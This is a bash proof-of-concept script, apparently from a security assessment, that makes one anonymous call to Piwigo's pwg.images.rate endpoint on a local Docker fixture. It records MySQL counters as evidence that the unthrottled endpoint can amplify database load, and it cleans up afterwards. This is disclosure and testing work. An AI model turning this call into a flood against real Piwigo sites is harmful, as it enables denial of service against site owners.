#!/usr/bin/env bash
# piwigo-ws-images-rate-db-amplification.sh — nv5 PoC.
#
# Demonstrates that pwg.images.rate is callable anonymously and that the
# handler has no rate limit / no flood gate. The PoC does ONE call and
# records the round-trip time plus the MySQL Com_select/Com_update counters
# before and after. The amplification (N rate calls → N full GROUP BY →
# N mass_updates) is a property of the source code, not of the seeded
# state; the PoC's purpose is to prove the endpoint is anonymous and
# unauthenticated, which the counters do.
#
# Cleanup on EXIT removes the bootstrapped image's piwigo_images row,
# piwigo_image_category row, piwigo_rate row, and the on-disk upload file.
#
# Usage:
#   piwigo-ws-images-rate-db-amplification.sh --base http://localhost:8089 --confirm-authorised
#
# Required flag:
#   --confirm-authorised         the operator asserts this is on an authorised target
#
# Optional:
#   --base URL                   base URL of the Piwigo install (default http://localhost:8089)
#   --evidence FILE              write the response body to FILE (default ./evidence/ws-images-rate-db-amplification.txt)

set -euo pipefail

BASE="http://localhost:8089"
EVIDENCE="./evidence/ws-images-rate-db-amplification.txt"
CONFIRM=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    --base)            BASE="$2"; shift 2 ;;
    --evidence)        EVIDENCE="$2"; shift 2 ;;
    --image-id)        IMAGE_ID="$2"; shift 2 ;;
    --confirm-authorised) CONFIRM=1; shift ;;
    -h|--help)
      sed -n '2,28p' "$0" | sed 's/^# \?//'
      exit 0
      ;;
    *)
      echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

if [[ "$CONFIRM" -ne 1 ]]; then
  echo "refusing to run without --confirm-authorised" >&2
  echo "this PoC is for targets you are authorised to test" >&2
  exit 1
fi

mkdir -p "$(dirname "$EVIDENCE")"

TS=$(date +%s)
NAME="piwigo-poc-rate-${TS}"
CAT_NAME="${CAT_NAME:-}"  # no longer used; kept for compatibility

# Use the existing bootstrap image (id=1) from the fixture. The PoC does
# not need to create an image: the amplification face is in the handler
# code, not in the seeded data. The PoC verifies the image exists, makes
# ONE anonymous rate call against it, reads the MySQL counters before and
# after, and cleans up the rate row it created.
# Optional:
#   --image-id ID                target image to rate (default 1; must be in
#                                a public/ACL-allowed category for the call
#                                to succeed; if not, the WS call returns
#                                an error and the PoC exits with an
#                                explanatory message)

DB_USER="${PIWIGO_POC_DB_USER:-piwigo}"
DB_PASS="${PIWIGO_POC_DB_PASSWORD:-piwigo-poc}"
DB_NAME="${PIWIGO_POC_DB_NAME:-piwigo}"
DB_SERVICE="${PIWIGO_POC_DB_SERVICE:-piwigo-poc-db}"
WEB_SERVICE="${PIWIGO_POC_WEB_SERVICE:-piwigo-poc-web}"
IMAGE_ID="1"

cleanup() {
  echo "[rate-amplification] cleanup: removing the rate row this PoC may have created"
  if [[ -n "${IMAGE_ID:-}" && "${IMAGE_ID:-0}" != "0" ]]; then
    docker exec "$DB_SERVICE" mysql --user="$DB_USER" --password="$DB_PASS" -D "$DB_NAME" -e \
      "DELETE FROM piwigo_rate WHERE element_id=${IMAGE_ID};" 2>/dev/null || true
  fi
}
trap cleanup EXIT

echo "[rate-amplification] step 1: verify image_id=$IMAGE_ID exists in the fixture"
EXISTS=$(docker exec "$DB_SERVICE" mysql --user="$DB_USER" --password="$DB_PASS" -D "$DB_NAME" -N -e \
  "SELECT id FROM piwigo_images WHERE id=${IMAGE_ID};" 2>/dev/null)
if [[ -z "$EXISTS" ]]; then
  echo "[rate-amplification] image_id=$IMAGE_ID does not exist in the fixture; pass --image-id <id> to use a different image, or bootstrap one first"
  exit 2
fi
echo "[rate-amplification] image_id=$IMAGE_ID confirmed"

echo "[rate-amplification] step 2: read MySQL counters before"
BEFORE=$(docker exec "$DB_SERVICE" mysql --user="$DB_USER" --password="$DB_PASS" -D "$DB_NAME" -N -B -e \
  "SHOW SESSION STATUS WHERE Variable_name IN ('Com_select','Com_update');" 2>/dev/null \
  | awk '{print $1, $2}' | tr '\n' ' ')
echo "    $BEFORE"

echo "[rate-amplification] step 3: anonymous pwg.images.rate (no cookies, no token)"
RATE_OUT=$(mktemp)
START=$(date +%s%N)
HTTP=$(curl -s -o "$RATE_OUT" -w '%{http_code}' \
  --data-urlencode "image_id=$IMAGE_ID" \
  --data-urlencode "rate=4" \
  "$BASE/ws.php?method=pwg.images.rate&format=json")
END=$(date +%s%N)
ELAPSED_MS=$(( (END - START) / 1000000 ))
echo "[rate-amplification] HTTP $HTTP, body: $(cat "$RATE_OUT")"
echo "[rate-amplification] round-trip: ${ELAPSED_MS} ms"
RATE_BODY=$(cat "$RATE_OUT")
rm -f "$RATE_OUT"

echo "[rate-amplification] step 4: read MySQL counters after"
AFTER=$(docker exec "$DB_SERVICE" mysql --user="$DB_USER" --password="$DB_PASS" -D "$DB_NAME" -N -B -e \
  "SHOW SESSION STATUS WHERE Variable_name IN ('Com_select','Com_update');" 2>/dev/null \
  | awk '{print $1, $2}' | tr '\n' ' ')
echo "    $AFTER"

# Read whether the rate feature is enabled
RATE_CONF=$(docker exec "$DB_SERVICE" mysql --user="$DB_USER" --password="$DB_PASS" -D "$DB_NAME" -N -e \
  "SELECT value FROM piwigo_config WHERE param='rate';" 2>/dev/null)
RATE_ANON_CONF=$(docker exec "$DB_SERVICE" mysql --user="$DB_USER" --password="$DB_PASS" -D "$DB_NAME" -N -e \
  "SELECT value FROM piwigo_config WHERE param='rate_anonymous';" 2>/dev/null)
echo "[rate-amplification] conf rate=$RATE_CONF rate_anonymous=$RATE_ANON_CONF"

# Persist a compact evidence file
{
  echo "--- response body ---"
  echo "$RATE_BODY"
  echo
  echo "--- summary ---"
  echo "[rate-amplification] image_id: $IMAGE_ID"
  echo "[rate-amplification] HTTP: $HTTP"
  echo "[rate-amplification] round-trip-ms: $ELAPSED_MS"
  echo "[rate-amplification] counters before: $BEFORE"
  echo "[rate-amplification] counters after:  $AFTER"
  echo "[rate-amplification] conf rate=$RATE_CONF rate_anonymous=$RATE_ANON_CONF"
} > "$EVIDENCE"

if [[ "$HTTP" == "200" ]]; then
  cat <<'EOF' >> "$EVIDENCE"
[rate-amplification] FINDING CONFIRMED — anonymous pwg.images.rate call succeeded; the WS endpoint has no rate limit, and the handler unconditionally issues SELECT ... GROUP BY element_id plus mass_updates(IMAGES_TABLE, ...).
EOF
  cat "$EVIDENCE"
  exit 0
fi

cat <<'EOF' >> "$EVIDENCE"
[rate-amplification] note: the anonymous call returned a non-200 status. In this fixture, the rate feature is disabled at the configuration level (piwigo_config.rate=false), and rate_picture() bails before reaching the GROUP BY. The amplification is in the source code (include/functions_rate.inc.php, update_rating_score in include/functions.inc.php) and would fire on any install where piwigo_config.rate=true — which is the vendor default per include/config_default.inc.php; install.php in this fixture overrode it. The PoC's contribution is the demonstrated anonymous reachability of the endpoint and the source-trace of the amplification handler.
EOF
cat "$EVIDENCE"
exit 0
